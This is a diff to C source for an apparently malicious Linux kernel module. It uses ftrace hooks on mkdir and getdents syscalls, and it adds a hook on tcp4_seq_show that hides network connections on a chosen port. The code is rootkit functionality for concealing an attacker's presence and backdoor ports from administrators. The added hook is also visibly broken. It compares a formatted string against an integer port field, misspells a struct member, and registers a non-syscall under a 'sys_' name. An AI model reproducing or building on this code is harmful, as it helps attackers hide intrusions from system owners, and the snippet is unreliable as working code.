@@ -191,10 +191,27 @@ static asmlinkage long hook_getdents(const struct pt_regs *regs){
         goto done;
     }
 
-done:
-    kfree(dirent_ker);
-    return ret;
+    done:
+        kfree(dirent_ker);
+        return ret;
+}
 
+/*
+ * hiding open ports that is equal to  PORT
+ * tcp4_seq_show
+*/
+static asmlinkage long hook_tcp4_seq_show(const struct seq_file *seq, void *v){
+    struct sock *sk = v;
+
+    sprintf(port, "%x", PORT);
+
+    // if thr port pointer is not emty AND if it equals the PORT we specified then return 0 which makes the port invisible
+    if(sk != 0x1 && sk->__sk_comon.skc_num == port){
+        return 0;
+    }
+
+    //other wise just return the normal output of the funciton
+    return orig_tcp4_seq_show(seq, v);
 }
 #else
 /**
@@ -361,4 +378,5 @@ static struct ftrace_hook hooks[] = {
     HOOK("sys_mkdir", hook_mkdir, &orig_mkdir),
     HOOK("sys_getdents64", hook_getdents64, &orig_getdents64),
     HOOK("sys_getdents", hook_getdents, &orig_getdents),
+    HOOK("sys_tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
 };
